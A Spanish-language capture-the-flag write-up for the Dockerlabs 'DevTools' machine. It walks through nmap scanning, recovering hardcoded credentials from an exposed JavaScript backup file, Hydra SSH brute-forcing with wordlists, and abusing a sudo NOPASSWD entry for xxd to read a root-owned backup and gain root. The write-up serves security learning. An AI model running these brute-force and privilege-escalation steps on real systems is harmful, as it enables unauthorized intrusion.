
# Writeup Template: Maquina `[ DevTools ]`

- Tags: #DevTools
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina DevTools](https://mega.nz/file/TQsx3SLY#ZtO_3auMe422od0KtMfC8mxAKWIgWwELiQ0qhADz3B0)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x DevTools.zip
sudo bash auto_deploy.sh devtools.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
```
---

## Enumeracion de [Servicio  Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```

#### Codigo fuente:
Revisando el codigo fuente tenemos la siguiente referencia que apunta a un archivo de tipo **backup**
```bash
<script src="[backupp.js](view-source:http://172.17.0.2/backupp.js)" defer></script>
```

Asi que ingresaremos a esa ruta para ver que es lo que contiene ya que la pagina principal nos pide contrasena para ver su contenenido
```bash
http://172.17.0.2/backupp.js
```

Logramos ver el codigo sin que nos pida contrasena:
```bash
const usuario = "chocolate";
const contrasena = "chocolate"; // Antigua contraseÃ±a baluleroh

const solicitarAutenticacion = () => {
    const credenciales = prompt("Ingrese las credenciales en el formato usuario:contraseÃ±a:");

    if (credenciales) {
        const [entradaUsuario, entradaContrasena] = credenciales.split(":");

        if (entradaUsuario === usuario && entradaContrasena === contrasena) {
            alert("AutenticaciÃ³n exitosa. Â¡Bienvenido!");
        } else {
            alert("AutenticaciÃ³n fallida. IntÃ©ntelo de nuevo.");
            solicitarAutenticacion(); // Reintentar autenticaciÃ³n
        }
    } else {
        alert("Debe ingresar las credenciales.");
        solicitarAutenticacion();
    }
};

solicitarAutenticacion();
```

Viendo tenemos dos posibles contrasenas que de igual manera probaremos por **ssh** de mientras ingresamos las credenciales para la web
```bash
chocolate:chocolate
```

### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada critico

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js
```

- **Hallazgos**:
	No reporta nada critico

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Realizaremos ataques por **ssh** para intentara descubrir credenciales validas para estos usuarios

### Ejecucion del Ataque
Con este no encontramos nada 
```bash
hydra -l chocolate -P /usr/share/wordlists/rockyou.txt -f ssh://172.17.0.2
```

Probaremos la contrasena antigua para ver si existe reciclamiento de contrasenas:
```bash
hydra -L /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -p baluleroh -f ssh://172.17.0.2
```

Tenemos una contrasena valida:
```bash
[22][ssh] host: 172.17.0.2   login: carlos   password: baluleroh
```
### Intrusion
```bash
# Reverse shell o acceso inicial
ssh-keygen -R 172.17.0.2 && ssh carlos@172.17.0.2 # ( baluleroh )
```

---
## Escalada de Privilegios
### Explotacion de Privilegios

###### Usuario `[ carlos ]`:
Listando los permisos de este usuario:
```bash
sudo -l

User carlos may run the following commands on caffc947401a:
    (ALL) NOPASSWD: /usr/bin/ping
    (ALL) NOPASSWD: /usr/bin/xxd
```

Revisando en los archivos de este usuario tenemos: **nota.txt**
```bash
cat nota.txt 

Backup en data.bak dentro del directorio de root
```

Asi que usaremos el binario **xxd** para poder leer su contenido:
```bash
sudo /usr/bin/xxd /root/data.bak | xxd -r
```

Tenemos las credenciales de **root**
```bash
root:balulerito
```

Migrando a **root**
```bash
# Comando para escalar al usuario: ( root )
su root # ( balulerito )
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
-rw-r--r--  1 root root   16 Dec 15 08:36 data.bak

root@caffc947401a:~# whoami
root
```

---
## Lecciones Aprendidas
1. Aprendimos a ver rutas alternas desde el codigo fuente de la web
2. Aprendimos ataque por diccionario por ssh
3. Aprendimos a explotar el bianrio de **xxd** para leer contenido sensible.

## Recomendaciones de Seguridad
- Evitar dar permisos de usuario a binarios privilegiados
